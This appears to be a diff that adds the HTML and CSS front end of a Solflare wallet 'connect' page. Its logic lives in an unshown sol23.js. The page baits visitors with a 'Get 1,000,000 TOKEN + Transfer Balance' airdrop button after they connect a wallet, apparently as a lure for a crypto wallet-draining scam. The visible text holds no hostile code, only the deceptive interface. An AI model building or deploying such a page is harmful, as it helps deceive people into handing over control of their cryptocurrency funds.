@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Solflare Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+            flex-direction: column;
+        }
+        
+        .connect-btn {
+            background: linear-gradient(135deg, #9945FF, #14F195);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .wallet-info {
+            display: none;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .balance-info {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        
+        .airdrop-btn {
+            background: linear-gradient(135deg, #FF6B6B, #FFA500);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .airdrop-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        
+        .wallet-option {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .wallet-option:hover {
+            border-color: #9945FF;
+            background: #f0f0ff;
+        }
+        
+        .close-btn {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        
+        .loading {
+            display: none;
+            color: #9945FF;
+            font-size: 16px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <button class="connect-btn" onclick="connectWallet()">Connect Wallet</button>
+    
+    <div id="walletInfo" class="wallet-info">
+        <h3>Wallet Connected</h3>
+        <div id="balanceInfo" class="balance-info">Loading balance...</div>
+        <button class="airdrop-btn" onclick="simulateAirdrop()">Get 1,000,000 TOKEN + Transfer Balance</button>
+        <div id="loading" class="loading">Processing transaction...</div>
+    </div>
+    
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <h2>Connect Wallet</h2>
+            <div class="wallet-option" onclick="connectSolflare()">
+                <h3>Solflare</h3>
+                <p>Connect using Solflare wallet</p>
+            </div>
+            <button class="close-btn" onclick="closeModal()">Close</button>
+        </div>
+    </div>
+
+    <script src="sol23.js"></script>
+</body>
+</html>
